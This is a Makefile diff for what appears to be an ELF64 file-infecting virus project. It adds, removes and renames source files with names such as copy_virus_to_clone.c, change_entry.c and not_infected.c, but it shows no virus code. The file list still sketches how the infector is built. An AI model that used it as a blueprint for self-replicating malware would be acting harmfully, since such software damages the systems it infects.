@@ -11,14 +11,15 @@ SRC =	loader.s                       \
 	virus/virus.c                  \
 	virus/accessors.c              \
 	virus/adjust_references.c      \
+	virus/not_infected.c           \
 	virus/change_entry.c           \
-	virus/known_instruction.c      \
 	virus/copy_virus_to_clone.c    \
 	virus/copy_client_to_clone.c   \
 	virus/disasm_block.c           \
 	virus/disasm_jumps.c           \
 	virus/disasm_operands.c        \
 	virus/disasm_length.c          \
+	virus/disasm_step.c            \
 	virus/elf64_iterators.c        \
 	virus/file_iterator.c          \
 	virus/find_entry.c             \
@@ -34,7 +35,7 @@ SRC =	loader.s                       \
 	virus/setup_virus_header.c     \
 	virus/syscall.c                \
 	virus/utils.c                  \
-	virus/write_jump.c             \
+	virus/jumps.c                  \
 	start.c
 
 CC = clang
